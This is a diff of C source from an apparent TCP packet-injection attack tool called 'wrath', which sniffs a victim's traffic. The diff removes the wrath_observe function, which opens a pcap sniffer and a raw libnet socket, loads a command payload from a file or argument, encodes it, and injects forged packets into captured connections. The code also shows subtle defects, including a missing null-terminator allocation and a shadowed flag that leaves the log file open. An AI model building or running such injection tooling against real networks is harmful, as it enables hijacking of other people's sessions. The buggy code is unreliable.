@@ -6,8 +6,6 @@
 #define ACK_PACKETS "tcp[tcpflags] & tcp-ack != 0"
 #define ACK_PACKETS_EXT "tcp[tcpflags] & tcp-ack != 0 and %s"
 
-void wrath_inject(u_char *, const struct pcap_pkthdr *, const u_char *);
-
 // places wrath in the position to capture the victims packets
 pcap_t *wrath_position(struct arg_values *cline_args) {
 	struct pcap_pkthdr cap_header;
@@ -56,101 +54,4 @@ pcap_t *wrath_position(struct arg_values *cline_args) {
 
 	free(filter_str);
 	return pcap_handle;
-}
-
-void wrath_observe(struct arg_values *cline_args) {
-	struct lcp_package *chp; // contains command-line args, libnet handle (file descriptor), and packet forgery memory
-	libnet_t *libnet_handle;
-	pcap_t *pcap_handle;
-	char libnet_errbuf[LIBNET_ERRBUF_SIZE];
-	char pcap_errbuf[PCAP_ERRBUF_SIZE];
-	char *device;
-	int openned = 0;
-
-	/* initializing bundle */
-	chp = (struct lcp_package *) malloc(sizeof (struct lcp_package));
-	memset(chp, 0x00, sizeof(struct lcp_package));
-
-	chp->cline_args = cline_args;
-
-	/* initializing sniffer, getting into position */
-	pcap_handle = wrath_position(cline_args); 
-
-	/* grabbing device name for libnet */
-		if (strcmp(cline_args->interface, "\0") == 0) { // if interface is not set
-			device = pcap_lookupdev(pcap_errbuf);
-			if(device == NULL) {
-				fprintf(stderr, "error fetching interface: %s %s\n", pcap_errbuf, "(this program must be run as root)");
-				exit(1);
-			}
-		} else { // if interface is set
-			device = cline_args->interface;
-		}
-
-	// initializing environment for libent in advanced mode
-	libnet_handle = libnet_init(LIBNET_RAW4_ADV, device, libnet_errbuf);
-	if (libnet_handle == NULL) {
-		fprintf(stderr, "trouble initiating libnet interface: %s \n", libnet_errbuf);
-		exit(1);
-	}
-	chp->libnet_handle = libnet_handle;
-
-	// finding payload
-	int length;
-	char *app_cmd = "\0";
-	if (strcmp(cline_args->input_file, "\0") != 0) { // If an input file has been specified
-		int app_fd;
-		app_fd = open(cline_args->input_file, O_RDONLY, 0);
-		if ((length = file_size(app_fd)) == -1)
-			fatal_error("getting file size");
-		app_cmd = (char *) safe_malloc(length);
-		read(app_fd, app_cmd, length);
-	} else if (!strcmp(cline_args->command, "\0") != 0) { // If a command has been specified but not an input file
-		length = strlen(cline_args->command);
-		app_cmd = (unsigned char *) safe_malloc(length);
-		strcpy(app_cmd, cline_args->command);
-	}	
-
-	// converting and setting payload
-	char *app_cmd_con = (char *) malloc(strlen(app_cmd));
-	if (strcmp(app_cmd, "\0") != 0) { // if a payload was found
-		wrath_char_encode(app_cmd, app_cmd_con);
-		free(app_cmd);	
-		chp->payload = app_cmd_con;
-	} else {
-		chp->payload = "\0";		
-	}
-
-	printf("Payload: %s\n", chp->payload);
-	
-	// seeding psuedorandom number generator
-	libnet_seed_prand(libnet_handle);
-
-	// finding and setting up logfile
-	FILE *fp;
-	if ((strcmp(cline_args->logfile, "\0"))) {
-		fp = fopen(cline_args->logfile, "w");
-		int openned = 1;
-		chp->logfile = fp;
-	}
-
-	int cap_amount = -1;
-	if (cline_args->count != 0) // if count is set
-		cap_amount = cline_args->count;
-
-	pcap_loop(pcap_handle, cap_amount, wrath_inject, (u_char *) chp);
-	pcap_close(pcap_handle);
-
-	// getting statistical information
-	struct libnet_stats l_stats;
-
-	libnet_stats(libnet_handle, &l_stats);
-	printf("Wrath Stats: \n");
-	printf("Packets Injected: %d\n", l_stats.packets_sent);
-
-	if (openned)
-		fclose(fp);
-	libnet_destroy(libnet_handle);
-	free(app_cmd_con);
-	free(chp);
 }
